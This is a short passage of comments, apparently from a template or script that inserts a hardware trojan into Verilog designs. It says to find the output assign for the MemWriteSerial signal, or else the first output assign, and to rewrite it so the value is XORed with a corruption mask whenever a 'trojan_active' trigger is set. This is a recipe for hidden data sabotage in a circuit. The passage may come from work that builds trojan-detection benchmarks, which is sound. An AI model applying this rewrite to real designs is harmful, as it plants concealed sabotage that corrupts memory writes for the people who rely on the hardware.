...
//
// IMPORTANT: MemWriteSerial may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If MemWriteSerial is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for MemWriteSerial (or first output assign):
//     assign MemWriteSerial = <expr>;
//   Replace with:
//     assign MemWriteSerial = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
